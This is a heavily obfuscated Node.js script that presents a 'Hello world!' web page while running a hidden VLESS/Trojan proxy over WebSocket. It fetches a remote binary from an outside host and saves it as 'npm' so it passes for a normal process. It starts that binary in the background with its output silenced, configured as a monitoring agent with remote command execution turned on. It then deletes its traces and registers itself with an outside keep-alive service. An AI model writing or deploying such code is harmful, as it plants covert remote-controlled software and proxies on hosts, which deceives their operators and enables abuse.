const _0x445558=_0x4604;(function(_0x562a45,_0x384f92){const _0x4b2db3=_0x4604,_0x55d9c5=_0x562a45();while(!![]){try{const _0x2c3638=parseInt(_0x4b2db3(0x183))/0x1+-parseInt(_0x4b2db3(0x16a))/0x2*(-parseInt(_0x4b2db3(0x185))/0x3)+-parseInt(_0x4b2db3(0x158))/0x4*(-parseInt(_0x4b2db3(0x170))/0x5)+-parseInt(_0x4b2db3(0x17c))/0x6*(parseInt(_0x4b2db3(0x180))/0x7)+-parseInt(_0x4b2db3(0x176))/0x8*(-parseInt(_0x4b2db3(0x169))/0x9)+-parseInt(_0x4b2db3(0x17d))/0xa*(-parseInt(_0x4b2db3(0x19c))/0xb)+-parseInt(_0x4b2db3(0x155))/0xc*(parseInt(_0x4b2db3(0x18f))/0xd);if(_0x2c3638===_0x384f92)break;else _0x55d9c5['push'](_0x55d9c5['shift']());}catch(_0x4c05e1){_0x55d9c5['push'](_0x55d9c5['shift']());}}}(_0x497b,0xd5dde));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x445558(0x150)),net=require('net'),path=require(_0x445558(0x157)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x445558(0x19a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x445558(0x16b)]||'39c37d00-61d6-4b60-9ca2-fa3c1189f8d1',NEZHA_SERVER=process[_0x445558(0x179)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env'][_0x445558(0x17a)]||![],WSPATH=process[_0x445558(0x179)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x445558(0x195)]||_0x445558(0x14a),NAME=process[_0x445558(0x179)]['NAME']||'',PORT=process['env']['PORT']||0xbb8;let ISP='';function _0x4604(_0x599bfc,_0x4095e9){_0x599bfc=_0x599bfc-0x149;const _0x497b8f=_0x497b();let _0x4604da=_0x497b8f[_0x599bfc];return _0x4604da;}const GetISP=async()=>{const _0x4275c3=_0x445558;try{const _0x25e96e=await axios[_0x4275c3(0x161)]('https://api.ip.sb/geoip'),_0x4b4034=_0x25e96e['data'];ISP=(_0x4b4034['country_code']+'-'+_0x4b4034[_0x4275c3(0x198)])['replace'](/ /g,'_');}catch(_0x231779){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x52bf25,_0x4c6284)=>{const _0x5c23bc=_0x445558;if(_0x52bf25['url']==='/'){const _0x3f4a81=path[_0x5c23bc(0x18e)](__dirname,'index.html');fs[_0x5c23bc(0x19b)](_0x3f4a81,'utf8',(_0x3d544e,_0x4da056)=>{const _0x12159a=_0x5c23bc;if(_0x3d544e){_0x4c6284[_0x12159a(0x184)](0xc8,{'Content-Type':'text/html'}),_0x4c6284[_0x12159a(0x152)](_0x12159a(0x159));return;}_0x4c6284['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x4c6284[_0x12159a(0x152)](_0x4da056);});return;}else{if(_0x52bf25[_0x5c23bc(0x165)]==='/'+SUB_PATH){const _0x3ef1e8=NAME?NAME+'-'+ISP:ISP,_0x1ed890='vless://'+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x5c23bc(0x17e)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3ef1e8,_0x315786='trojan://'+UUID+_0x5c23bc(0x153)+DOMAIN+_0x5c23bc(0x17e)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3ef1e8,_0x4e51c8=_0x1ed890+'\x0a'+_0x315786,_0x2d2b8f=Buffer['from'](_0x4e51c8)[_0x5c23bc(0x18d)](_0x5c23bc(0x189));_0x4c6284[_0x5c23bc(0x184)](0xc8,{'Content-Type':_0x5c23bc(0x17f)}),_0x4c6284['end'](_0x2d2b8f+'\x0a');}else _0x4c6284[_0x5c23bc(0x184)](0x194,{'Content-Type':_0x5c23bc(0x17f)}),_0x4c6284[_0x5c23bc(0x152)](_0x5c23bc(0x16d));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x445558(0x188),_0x445558(0x14c)];function resolveHost(_0xdf2a77){return new Promise((_0x17a95d,_0x9dd139)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xdf2a77)){_0x17a95d(_0xdf2a77);return;}let _0x4f4ea5=0x0;function _0x183a6d(){const _0x4843a2=_0x4604;if(_0x4f4ea5>=DNS_SERVERS['length']){_0x9dd139(new Error(_0x4843a2(0x190)+_0xdf2a77+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x41ab27=DNS_SERVERS[_0x4f4ea5];_0x4f4ea5++;const _0x32bece=_0x4843a2(0x197)+encodeURIComponent(_0xdf2a77)+'&type=A';axios[_0x4843a2(0x161)](_0x32bece,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4843a2(0x15b)](_0x269887=>{const _0xe47136=_0x4843a2,_0x4a3eba=_0x269887['data'];if(_0x4a3eba['Status']===0x0&&_0x4a3eba[_0xe47136(0x168)]&&_0x4a3eba[_0xe47136(0x168)]['length']>0x0){const _0x24e268=_0x4a3eba['Answer']['find'](_0x4ab001=>_0x4ab001[_0xe47136(0x149)]===0x1);if(_0x24e268){_0x17a95d(_0x24e268[_0xe47136(0x167)]);return;}}_0x183a6d();})[_0x4843a2(0x194)](_0x190274=>{_0x183a6d();});}_0x183a6d();});}function handleVlessConnection(_0x14894c,_0x4e562d){const _0x4c56b6=_0x445558,[_0x4d5616]=_0x4e562d,_0x26ecea=_0x4e562d['slice'](0x1,0x11);if(!_0x26ecea[_0x4c56b6(0x17b)]((_0x44476a,_0x3d69c2)=>_0x44476a==parseInt(uuid[_0x4c56b6(0x191)](_0x3d69c2*0x2,0x2),0x10)))return![];let _0x3718f6=_0x4e562d['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x173b99=_0x4e562d['slice'](_0x3718f6,_0x3718f6+=0x2)['readUInt16BE'](0x0),_0x398753=_0x4e562d['slice'](_0x3718f6,_0x3718f6+=0x1)['readUInt8'](),_0x3bb491=_0x398753==0x1?_0x4e562d['slice'](_0x3718f6,_0x3718f6+=0x4)[_0x4c56b6(0x18e)]('.'):_0x398753==0x2?new TextDecoder()[_0x4c56b6(0x166)](_0x4e562d[_0x4c56b6(0x156)](_0x3718f6+0x1,_0x3718f6+=0x1+_0x4e562d[_0x4c56b6(0x156)](_0x3718f6,_0x3718f6+0x1)['readUInt8']())):_0x398753==0x3?_0x4e562d['slice'](_0x3718f6,_0x3718f6+=0x10)['reduce']((_0x3dfff1,_0x1449e3,_0x240685,_0xf1017)=>_0x240685%0x2?_0x3dfff1['concat'](_0xf1017['slice'](_0x240685-0x1,_0x240685+0x1)):_0x3dfff1,[])[_0x4c56b6(0x154)](_0x1dea21=>_0x1dea21['readUInt16BE'](0x0)[_0x4c56b6(0x18d)](0x10))['join'](':'):'';_0x14894c[_0x4c56b6(0x151)](new Uint8Array([_0x4d5616,0x0]));const _0x2943f9=createWebSocketStream(_0x14894c);return resolveHost(_0x3bb491)['then'](_0x2a84fc=>{const _0x2776f0=_0x4c56b6;net[_0x2776f0(0x19f)]({'host':_0x2a84fc,'port':_0x173b99},function(){const _0x40149f=_0x2776f0;this[_0x40149f(0x186)](_0x4e562d['slice'](_0x3718f6)),_0x2943f9['on']('error',()=>{})[_0x40149f(0x14e)](this)['on'](_0x40149f(0x175),()=>{})['pipe'](_0x2943f9);})['on']('error',()=>{});})[_0x4c56b6(0x194)](_0x23bae4=>{const _0x2ce32f=_0x4c56b6;net[_0x2ce32f(0x19f)]({'host':_0x3bb491,'port':_0x173b99},function(){const _0x39f45c=_0x2ce32f;this[_0x39f45c(0x186)](_0x4e562d['slice'](_0x3718f6)),_0x2943f9['on']('error',()=>{})[_0x39f45c(0x14e)](this)['on'](_0x39f45c(0x175),()=>{})[_0x39f45c(0x14e)](_0x2943f9);})['on'](_0x2ce32f(0x175),()=>{});}),!![];}function handleTrojanConnection(_0x2c3f72,_0x29491c){const _0x3adb8c=_0x445558;try{if(_0x29491c[_0x3adb8c(0x163)]<0x3a)return![];const _0x594b69=_0x29491c[_0x3adb8c(0x156)](0x0,0x38)['toString'](),_0x3bf3b9=[UUID];let _0x201624=null;for(const _0x4b88c6 of _0x3bf3b9){const _0x4b5f57=crypto[_0x3adb8c(0x162)](_0x3adb8c(0x177))[_0x3adb8c(0x178)](_0x4b88c6)['digest'](_0x3adb8c(0x164));if(_0x4b5f57===_0x594b69){_0x201624=_0x4b88c6;break;}}if(!_0x201624)return![];let _0x1d8ee7=0x38;_0x29491c[_0x1d8ee7]===0xd&&_0x29491c[_0x1d8ee7+0x1]===0xa&&(_0x1d8ee7+=0x2);const _0x3ff3ab=_0x29491c[_0x1d8ee7];if(_0x3ff3ab!==0x1)return![];_0x1d8ee7+=0x1;const _0xb87380=_0x29491c[_0x1d8ee7];_0x1d8ee7+=0x1;let _0x5b386b,_0x23619b;if(_0xb87380===0x1)_0x5b386b=_0x29491c['slice'](_0x1d8ee7,_0x1d8ee7+0x4)[_0x3adb8c(0x18e)]('.'),_0x1d8ee7+=0x4;else{if(_0xb87380===0x3){const _0x5a9266=_0x29491c[_0x1d8ee7];_0x1d8ee7+=0x1,_0x5b386b=_0x29491c['slice'](_0x1d8ee7,_0x1d8ee7+_0x5a9266)['toString'](),_0x1d8ee7+=_0x5a9266;}else{if(_0xb87380===0x4)_0x5b386b=_0x29491c['slice'](_0x1d8ee7,_0x1d8ee7+0x10)['reduce']((_0x1cc3e9,_0x17893f,_0x8061fd,_0x22862a)=>_0x8061fd%0x2?_0x1cc3e9[_0x3adb8c(0x18a)](_0x22862a[_0x3adb8c(0x156)](_0x8061fd-0x1,_0x8061fd+0x1)):_0x1cc3e9,[])[_0x3adb8c(0x154)](_0x5c186a=>_0x5c186a['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x1d8ee7+=0x10;else return![];}}_0x23619b=_0x29491c[_0x3adb8c(0x181)](_0x1d8ee7),_0x1d8ee7+=0x2;_0x1d8ee7<_0x29491c['length']&&_0x29491c[_0x1d8ee7]===0xd&&_0x29491c[_0x1d8ee7+0x1]===0xa&&(_0x1d8ee7+=0x2);const _0x49d230=createWebSocketStream(_0x2c3f72);return resolveHost(_0x5b386b)[_0x3adb8c(0x15b)](_0x4e48de=>{net['connect']({'host':_0x4e48de,'port':_0x23619b},function(){const _0x3646f9=_0x4604;_0x1d8ee7<_0x29491c[_0x3646f9(0x163)]&&this[_0x3646f9(0x186)](_0x29491c[_0x3646f9(0x156)](_0x1d8ee7)),_0x49d230['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x49d230);})['on']('error',()=>{});})[_0x3adb8c(0x194)](_0x403b06=>{const _0x4165e7=_0x3adb8c;net[_0x4165e7(0x19f)]({'host':_0x5b386b,'port':_0x23619b},function(){const _0x4264b0=_0x4165e7;_0x1d8ee7<_0x29491c[_0x4264b0(0x163)]&&this['write'](_0x29491c[_0x4264b0(0x156)](_0x1d8ee7)),_0x49d230['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x4264b0(0x14e)](_0x49d230);})['on']('error',()=>{});}),!![];}catch(_0x95a0ef){return![];}}function _0x497b(){const _0x3322d3=['sha224','update','env','AUTO_ACCESS','every','1238478kpiVgc','2430GwTsal','&fp=chrome&type=ws&host=','text/plain','7qbjGsw','readUInt16BE','stream','1018357ZcmnTp','writeHead','9aEzoZd','write','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','8.8.4.4','base64','concat','2053','finish','toString','join','13qmLwOo','Failed\x20to\x20resolve\x20','substr','https://amd64.ssss.nyc.mn/agent','pop','catch','SUB_PATH','split','https://dns.google/resolve?name=','isp','message','child_process','readFile','79002eNpAuD','close','unlink','connect','includes','https://oooo.serv00.net/add-url','type','sub','post','1.1.1.1','aarch64','pipe','true','axios','send','end','@cdns.doon.eu.org:443?security=tls&sni=','map','35902668QLnGlg','slice','path','1719160jPunFr','Hello\x20world!','log','then','2087','application/json','8443','writeFileSync','client_secret:\x20','get','createHash','length','hex','url','decode','data','Answer','1278MEZKPL','545726jWkQuU','UUID','arch','Not\x20Found\x0a','trim','setsid\x20nohup\x20./npm\x20-s\x20','5AmzFoH','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/v1','false','error','3512pHUKnY'];_0x497b=function(){return _0x3322d3;};return _0x497b();}wss['on']('connection',(_0x3e00e3,_0x32d20c)=>{const _0x434c44=_0x445558,_0x1f10e5=_0x32d20c[_0x434c44(0x165)]||'';_0x3e00e3['once'](_0x434c44(0x199),_0x126dcb=>{const _0x14ae4d=_0x434c44;if(_0x126dcb[_0x14ae4d(0x163)]>0x11&&_0x126dcb[0x0]===0x0){const _0x33502e=_0x126dcb[_0x14ae4d(0x156)](0x1,0x11),_0x462319=_0x33502e['every']((_0x298b64,_0x24bf8e)=>_0x298b64==parseInt(uuid[_0x14ae4d(0x191)](_0x24bf8e*0x2,0x2),0x10));if(_0x462319){!handleVlessConnection(_0x3e00e3,_0x126dcb)&&_0x3e00e3[_0x14ae4d(0x19d)]();return;}}!handleTrojanConnection(_0x3e00e3,_0x126dcb)&&_0x3e00e3['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x56a1c2=_0x445558,_0x1a1997=os[_0x56a1c2(0x16c)]();return _0x1a1997==='arm'||_0x1a1997==='arm64'||_0x1a1997===_0x56a1c2(0x14d)?!NEZHA_PORT?_0x56a1c2(0x173):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x56a1c2(0x171):_0x56a1c2(0x192);},downloadFile=async()=>{const _0x35df5f=_0x445558;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x21a2c0=getDownloadUrl(),_0x40812f=await axios({'method':_0x35df5f(0x161),'url':_0x21a2c0,'responseType':_0x35df5f(0x182)}),_0xdcbc88=fs['createWriteStream']('npm');return _0x40812f['data'][_0x35df5f(0x14e)](_0xdcbc88),new Promise((_0x443a8f,_0x3e562d)=>{const _0x580210=_0x35df5f;_0xdcbc88['on'](_0x580210(0x18c),()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x2e1b9f=>{if(_0x2e1b9f)_0x3e562d(_0x2e1b9f);_0x443a8f();});}),_0xdcbc88['on'](_0x580210(0x175),_0x3e562d);});}catch(_0x2b4aa9){throw _0x2b4aa9;}},runnz=async()=>{const _0x3ef6d1=_0x445558;try{const _0x3b36eb=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x3b36eb[_0x3ef6d1(0x16e)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x281248){}await downloadFile();let _0x5c7e88='',_0x147ef7=['443',_0x3ef6d1(0x15e),'2096',_0x3ef6d1(0x15c),'2083',_0x3ef6d1(0x18b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51e1a1=_0x147ef7['includes'](NEZHA_PORT)?'--tls':'';_0x5c7e88=_0x3ef6d1(0x16f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x51e1a1+_0x3ef6d1(0x187);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x221c84=NEZHA_SERVER[_0x3ef6d1(0x1a0)](':')?NEZHA_SERVER[_0x3ef6d1(0x196)](':')[_0x3ef6d1(0x193)]():'',_0x99c471=_0x147ef7['includes'](_0x221c84)?_0x3ef6d1(0x14f):_0x3ef6d1(0x174),_0x4fb6d5=_0x3ef6d1(0x160)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x99c471+_0x3ef6d1(0x172)+UUID;fs[_0x3ef6d1(0x15f)]('config.yaml',_0x4fb6d5);}_0x5c7e88='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5c7e88,{'shell':'/bin/bash'},_0x3f489d=>{const _0x2538d8=_0x3ef6d1;if(_0x3f489d)console[_0x2538d8(0x175)]('npm\x20running\x20error:',_0x3f489d);else console['log']('npm\x20is\x20running');});}catch(_0x9e67a2){console['error']('error:\x20'+_0x9e67a2);}};async function addAccessTask(){const _0x3a2af9=_0x445558;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x514336='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x4eb87f=await axios[_0x3a2af9(0x14b)](_0x3a2af9(0x1a1),{'url':_0x514336},{'headers':{'Content-Type':_0x3a2af9(0x15d)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4f09f6){}}const delFiles=()=>{const _0x4880f8=_0x445558;fs[_0x4880f8(0x19e)]('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0xbc08be=_0x445558;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xbc08be(0x15a)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
